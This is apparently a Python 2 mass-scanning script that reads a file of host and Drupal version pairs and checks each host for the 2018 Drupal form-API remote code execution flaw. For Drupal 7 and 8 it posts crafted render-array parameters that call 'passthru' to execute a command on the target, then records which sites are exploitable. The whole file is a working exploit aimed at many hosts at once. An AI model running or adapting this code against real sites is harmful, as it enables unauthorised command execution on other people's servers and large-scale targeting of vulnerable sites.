import requests
import re
import string
import random
import sys
import time
import urllib3
from functools import partial
from random import randint
from multiprocessing import Pool
import bb01_ultilities as ulti

start = time.time()
urllib3.disable_warnings()
print sys.argv[1]
file = open(sys.argv[1], 'r')
outputfile = sys.argv[2]
lines = file.readlines()
# outputfile = "output.txt"


def isFormValid(host, version, headers):
    form_id = 'user/password' if version[:1] == '7' else 'user/register'
    urlq = host + '?q=' + form_id
    url = host + form_id
    # print url
    # redirectURL = ulti.isURLRedirected(url)
    # if(redirectURL is not False):
    #     return redirectURL
    check = ulti.checkURLStatus(urlq)
    if (check is not False):
        return check

    check = ulti.checkURLStatus(url)
    if (check is not False):
        return check

    return False


def isPwnAble_2018(host, version, headers):
    signature = ulti.genSignature()
    version = version[:1]
    if version == '7':
        get_params = {'q': 'user/password', 'name[#post_render][]': 'passthru',
                      'name[#type]': 'markup',
                      'name[#markup]': ' echo ' + signature}
        post_params = {'form_id': 'user_pass',
                       '_triggering_element_name': 'name'}
        try:
            r = requests.post(host, data=post_params,
                              params=get_params, verify=False,
                              headers=headers, timeout=1)
        except:
            return False
        m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)"', r.text)
        if m:
            found = m.group(1)
            get_params = {'q': 'file/ajax/name/#value/' + found}
            post_params = {'form_build_id': found}
            res = requests.post(host, data=post_params,
                                params=get_params, headers=headers, timeout=1)
            detect = bool(re.search(signature, res.text))
            if detect:
                return True
        else:
            return False
    if version == '8':
        host = host + 'user/register?element_parents=account/mail/%23value\
                        &ajax_form=1&_wrapper_format=drupal_ajax'
        post_params = {'form_id': 'user_register_form', '_drupal_ajax': '1',
                       'mail[a][#post_render][]': 'passthru',
                       'mail[a][#type]': 'markup',
                       'mail[a][#markup]': ' echo ' + signature}
        try:
            r = requests.post(host, data=post_params,
                              verify=False, headers=headers, timeout=1)
        except:
            return False

        m = bool(re.search(signature, r.text))
        if m:
            return True
        else:
            return False


def isVulnerable(lines):
    headers = ulti.genHeader()
    host = "http://"+lines.strip().split("|")[0]+"/"
    # print host
    version = lines.strip().split("|")[1]
    formValid = isFormValid(host, version, headers)
    if (formValid is True):
        isPwned = isPwnAble_2018(host, version, headers)
        if isPwned is True:
            with open(outputfile, 'a') as f:
                f.write("%s === Vuln OK ===\n" % host.encode("utf-8"))
        else:
            with open(outputfile, 'a') as f:
                f.write("%s === Vuln Fail ===\n" % host.encode("utf-8"))
    elif (formValid is False):
        with open(outputfile, 'a') as f:
            f.write("%s === Form Fail ===\n" % host.encode("utf-8"))
    else:
        with open(outputfile, 'a') as f:
            f.write("%s === Redirected ===  || %s  \n"
                    % (host.encode("utf-8"), formValid))


if __name__ == "__main__":
    # lines = 'argusme.com|7.44'
    # version = ''
    # isVulnerable(lines)
    # print('=' * 25)
    try:
        # p = Pool(processes=20)
        # result = p.map(isVulnerable, lines)
        for line in lines:
            isVulnerable(line)
        # isVulnerable(line)
    except:
        result = ""

    # Open output file and write the total time scanning
    with open(outputfile, 'a') as f:
        f.write("------| Total Time: %s |-------\n" % (time.time() - start))
